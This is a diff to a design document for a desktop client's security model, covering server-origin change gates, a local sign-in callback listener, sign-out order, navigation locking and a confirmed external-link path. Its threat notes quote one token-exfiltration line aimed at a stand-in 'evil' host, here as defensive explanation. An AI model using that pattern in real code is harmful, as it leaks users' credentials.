@@ -11,7 +11,7 @@ access**. Everything it can see or change goes through the server gateway, so
 | | Legacy desktop (`apps/desktop`) | Prism Client (`apps/client`) |
 |---|---|---|
 | Trust model | Holds the vault JWT, talks to `localhost:1940` | Holds a per-device `pd_…` token, talks to one Prism Server |
-| Backend | ~100 Rust commands, sync services, `claude`/`gog`/`gh` subprocesses | 5 commands: `get_token`, `sign_in`, `sign_out`, `get_server_origin`, `set_server_origin` |
+| Backend | ~100 Rust commands, sync services, `claude`/`gog`/`gh` subprocesses | 6 commands: `get_token`, `sign_in`, `sign_out`, `get_server_origin`, `set_server_origin`, `open_external` |
 | UI | Desktop build of `@prism/core` | `apps/web` built with `--mode native` |
 | Identity | `Prism`, `com.benjaminlife.prism` | **`Prism Client`**, `com.benjaminlife.prism.client` |
 | Agent / ingest | Local | Server-side (`/api/agent/*`, server workers) |
@@ -51,9 +51,17 @@ Accepted: `https://host[:port]`; `http://` only for `127.0.0.1`/`localhost`/`[::
 test server). Ports 1939/1940 (hub/vault) are refused: the client never talks to a vault.
 No path, query, fragment or userinfo.
 
-The Server Settings dialog is page UI, but saving needs a **single-use grant** that the
-shell mints only when the user picks the native menu item (valid 10 minutes). Page
-script alone therefore can't repoint the app at another server.
+The Server Settings dialog is page UI, so page script could alter what it submits. Two
+gates stand behind it:
+
+1. A **single-use grant**. The shell mints it only when the user picks the native menu
+   item. It is valid for 10 minutes and is consumed by any save attempt, right or wrong.
+2. A **native confirmation**, which is the real boundary. It shows the normalized origin
+   that will actually be saved ("Point Prism Client at https://…? You will need to sign
+   in…", with Cancel as the default button).
+
+Only the dialog's **Change Server** button persists. Cancel or closing it saves nothing and
+still consumes the grant.
 
 The same file stores the main window's size/position/maximized state. It never holds a
 token.
@@ -69,7 +77,9 @@ The server side is documented in [native-auth.md](native-auth.md). The client le
 3. The **system browser** opens
    `/auth/device/authorize?client_id=prism-native&redirect_uri=http://127.0.0.1:<port>/callback&code_challenge=…&code_challenge_method=S256&state=…&label=Prism Client on <host>`.
    The user signs in with the normal web login (password or owner magic link) and approves.
-4. The listener accepts exactly **one** `GET /callback` carrying our `state` (constant-time
+4. Each local connection is served in its own task: at most 8 at once, extras dropped,
+   2 s to send the request. An idle or slow local socket therefore can't stall sign-in.
+   The listener accepts exactly **one** `GET /callback` carrying our `state` (constant-time
    compare), answers with a static page, and closes. Wrong paths get 404, and forged or
    stale `state` gets 400. Neither ends the wait, so a local process can't cancel a real
    sign-in. The whole wait times out after 10 minutes. Pressing Sign in again cancels the
@@ -95,9 +105,12 @@ or a universal link. It plugs into the `#[cfg(mobile)]` arm of `signin.rs` and r
 
 - **Account → Sign out** (web `logout()`): revokes with the bearer, then
   `onSignedOut()` → `sign_out {revoke:false}` deletes the keychain item.
-- **Prism → Sign Out** (menu): `sign_out {revoke:true}` revokes
-  (`POST /auth/device/revoke token=…`) and deletes the item. It also deletes the offline
-  read cache (`prism-read-cache`) and reloads.
+- **Prism → Sign Out** (menu): `sign_out {revoke:true}` works in this order:
+  1. It revokes (`POST /auth/device/revoke token=…`) with whatever token it knows, from
+     memory or else from the keychain.
+  2. It then forgets the token: first in memory, then in the keychain. A keychain failure
+     can therefore never skip the revoke, and it is reported to the UI as a toast.
+  3. It deletes the offline read cache (`prism-read-cache`) and reloads.
 - **401** on our token: `onUnauthorized()` → `sign_out {revoke:false}` (the token is dead
   anyway). The app shows the sign-in screen. It never auto-opens the browser.
 
@@ -147,14 +160,35 @@ just as in the PWA.
     ["style-src"]`) so that `'unsafe-inline'` keeps working for editor libraries that
     inject `<style>`.
 - **Capabilities** (`capabilities/default.json`): the `main` window gets
-  `allow-get-token`, `allow-sign-in`, `allow-sign-out`, `allow-get-server-origin` and
-  `allow-set-server-origin`, and nothing else.
+  `allow-get-token`, `allow-sign-in`, `allow-sign-out`, `allow-get-server-origin`,
+  `allow-set-server-origin` and `allow-open-external`, and nothing else.
   - `build.rs` declares the commands in the app manifest, so anything not granted is denied.
   - There are no `core:*` permissions, and no fs, shell, http or opener permissions for JS.
   - There is no `remote` block: remote pages get no IPC.
-- **Navigation**: the webview may only show the bundled app (`tauri://localhost`, or
-  `about:` frames). Clicked `http(s)`/`mailto` links and `window.open` go to the system
-  browser through the opener plugin's Rust API. Everything else is refused.
+- **Navigation** (`window.rs` `navigation_decision`): only the bundled app
+  (`tauri://localhost`) and inert `about:` frames load. Every other navigation is cancelled
+  silently, with no side effect.
+  - This covers the main frame and subframes alike. wry's callback gets only the URL, not
+    the frame, so the rule has to be safe for both.
+  - A `<meta refresh>` in a website-note iframe goes nowhere, and so does
+    `location = "https://evil/?t=…"`. `window.open` is refused the same way
+    (`on_new_window` → Deny).
+- **Opening links** is a separate, explicit path:
+  - The host hook intercepts clicks on external `<a href>` (capture phase) and external
+    `window.open(url)` calls, and calls `open_external`.
+  - Rust checks the scheme (`http`/`https`/`mailto` only, no userinfo, ≤4096 chars; never a
+    bundle, `javascript:`, `file:` or custom-scheme URL).
+  - It then shows a **native** `NSAlert` with the URL (`confirm.rs`). Only the user's click
+    on **Open** reaches the opener. On non-macOS platforms the dialog answers "no" until
+    WP5 adds one.
+- **The token is readable by page script, so XSS = token theft.** The WP2.2 contract gives
+  `getToken()` to the page, because its `fetch` needs it.
+  - The CSP (`connect-src`/`img-src`) limits where the page can *fetch*, but it is **not a
+    boundary against navigation**. The shell's navigation lock and the native confirmation
+    on `open_external` are what stand in the way of `location = …`/`window.open` exfiltration.
+  - Even so, a user who clicks **Open** on a URL carrying the token hands it over. Treat any
+    XSS in the web bundle as a full compromise of that device token. It is revocable in
+    Account → Signed-in devices, and it dies after 90 idle days.
 - **No process spawning** in the shell's code. The opener plugin uses macOS
   LaunchServices (`open`) to show the browser.
 - **Verified by** `scripts/verify-client.mjs` and the Rust unit tests.
@@ -174,6 +208,15 @@ just as in the PWA.
   property).
 - `dirs::config_dir()` is used for settings because the CSP must be known before the Tauri
   app exists. On iOS (WP5.1) this must move to the app's sandbox container.
+- **L3: keychain hardening.** Blocked on Apple signing (D1). The item currently lives in the
+  file-based login keychain with an app-ACL. With a Developer ID/team signature, move it to
+  the data-protection keychain (`use_protected_keychain`) with
+  `kSecAttrAccessibleWhenUnlockedThisDeviceOnly` (plus a keychain-access-group
+  entitlement).
+- **L4: bundle the fonts.** Ship Inter/JetBrains Mono/Newsreader/DM Sans and Excalidraw's
+  hand-drawn fonts in the native build. That would drop `https://fonts.googleapis.com`,
+  `https://fonts.gstatic.com` and `https://esm.sh` from the CSP, leaving the server as the
+  only remote origin.
 
 ## What WP5 (iOS) adds to this shell
 
